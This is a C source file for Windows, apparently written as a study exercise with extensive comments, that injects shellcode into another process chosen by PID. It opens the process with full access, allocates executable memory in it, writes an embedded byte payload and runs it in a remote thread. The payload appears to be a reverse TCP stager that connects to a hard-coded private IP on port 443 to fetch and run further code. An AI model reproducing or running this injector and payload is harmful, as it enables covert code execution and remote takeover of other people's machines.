#include<Windows.h>
#include<stdio.h>


const char *k = "[+]";
const char *e = "[-]";
const char *i = "[*]";


DWORD PID,TID =NULL; //Unsign interger 32-bit
HANDLE hProcess, hThread = NULL; 
LPVOID rBuffer = NULL; //void far(Data Type): beyound 64kb storage (Default) far indicated that the pointer should to use the segment or offset to access the memory.

unsigned char payloads[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x51\x48\x8b\x52\x18"
"\x56\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x8b\x48\x18\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
"\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x89\x81\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";



int main(int argc, char *argv[]){
    //argc -> argument count (Command Line)
    //argv -> argument vector, receive user input parameter form (Command Line)

    //*Check User's parameter*
    if(argc < 2){  
        //argv[0] -> programe name 
        //argv[1] -> PID 
        printf("%s Usage: program.exe <PID>",e);  
        return EXIT_FAILURE;

    }

    //*Recive user input asign to PID variable*
    PID = atoi(argv[1]); // input:string , "ASCII to Integer" String to interger 
    printf("%s Open a handle to process (%ld)\n",i,PID); //ld (long int-decimal)


//*Process Hanlder, open the handle to process* 

    // HANDLE OpenProcess
    //   [in] DWORD dwDesiredAccess, //Procss Access Rights  
    //   [in] BOOL  bInheritHandle, // inheritHandle From the parant process 
    //   [in] DWORD dwProcessId
    // );
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, 
        FALSE,
        PID
    );

    //*Check Open handle Error* 
    if (hProcess==NULL){
        printf("%s Can't not to opent the handler to the process (%ld) error: %ld", e, PID, GetLastError());
        // Retrived and calling the threads last Error code value -> System Error Code 
        return EXIT_FAILURE; 
    }else {
        printf("%s Got the handle to process\n\\---0x%p\n ",k,hProcess);
    }

//*To Allocate the Virtuall memory to the process*

    // LPVOID VirtualAllocEx(
    //   [in]           HANDLE hProcess,  //Specify Process 
    //   [in, optional] LPVOID lpAddress,
    //   [in]           SIZE_T dwSize,
    //   [in]           DWORD  flAllocationType,
    //   [in]           DWORD  flProtect
    // );
    //return: base address of the allocated region of pages.

    rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(payloads),
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_EXECUTE_READWRITE
    );
    printf("%s Allocate %zu-Byptes with PAGE_EXECUTE_READWRITE Permission within process\n", k, sizeof(payloads));



//*Write data to area of memory*

    // BOOL WriteProcessMemory(
    //   [in]  HANDLE  hProcess,        //A handle to the process memory to be modified.
    //   [in]  LPVOID  lpBaseAddress,   //A pointer to the base address in the specified process to which data is written. 
    //   [in]  LPCVOID lpBuffer,        //A pointer to the buffer that contains data to be written in the address space of the specified process.
    //   [in]  SIZE_T  nSize,           //The number of bytes to be written to the specified process.
    //   [out] SIZE_T  *lpNumberOfBytesWritten //A pointer to a variable that receives the number of bytes transferred into the specified process. This parameter is optional. If lpNumberOfBytesWritten is NULL, the parameter is ignored.
    // );
    // return: If the function succeeds, the return value is nonzero.
    // If the function fails, the return value is 0 (zero)

    int isInjectSucess = WriteProcessMemory(
        hProcess,
        rBuffer,
        payloads,
        sizeof(payloads),
        NULL
    );
    printf("%s Wrote %zu-Bytes to process memory\n",k,sizeof(payloads));
    if (isInjectSucess != 0){
        printf("%s Write sometheing in virtual memory Sucessfully!!\n",k);
    }else{
        printf("%s Fail to write paylaod to memory, error:%ld\n", e, GetLastError());
    }

//*Create a thread taht run the payload in virtual address space 

    // HANDLE CreateRemoteThread(
    //   [in]  HANDLE                 hProcess,
    //   [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,  //(security setting)A pointer to a SECURITY_ATTRIBUTES structure , . If lpThreadAttributes is NULL, the thread gets a default security descriptor and the handle cannot be inherited.
    //   [in]  SIZE_T                 dwStackSize,  //The initial size of the stack, in bytes, . If this parameter is 0 (zero), the new thread uses the default size for the executable.
    //   [in]  LPTHREAD_START_ROUTINE lpStartAddress,  //A pointer to the application-defined function of type LPTHREAD_START_ROUTINE,represents the starting address of the thread in the remote process 
    //   [in]  LPVOID                 lpParameter,  //A pointer to a variable to be passed to the thread function.
    //   [in]  DWORD                  dwCreationFlags,  //The flags that control the creation of the thread. 0 The thread runs immediately after creation. 
    //   [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,  //An attribute list that contains additional parameters for the new thread
    //   [out] LPDWORD                lpThreadId  //A pointer to a variable that receives the thread identifier.
    // );
    // returnIf the function succeeds, the return value is a handle to the new thread.
    // If the function fails, the return value is NULL

    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer,
        NULL,
        0,
        0,
        &TID
    );

    if(hThread == NULL){
        printf("%s Fail to create and handle the Reomte Threads, Error:%ld", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    
    printf("%s Got the handle to the thread TID=(%ld) \n\\---0x%p\n ",k,TID,hThread);

//"*wait the thread to run shell code"
    printf("%s Wait for thread to run the shell code \n",k);
    WaitForSingleObject(hThread,INFINITE);
    printf("%s Threade Finishted\n",k);

    printf("%s Clean Up",i);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s Clean Finished ! ",k);
    return EXIT_SUCCESS;
}
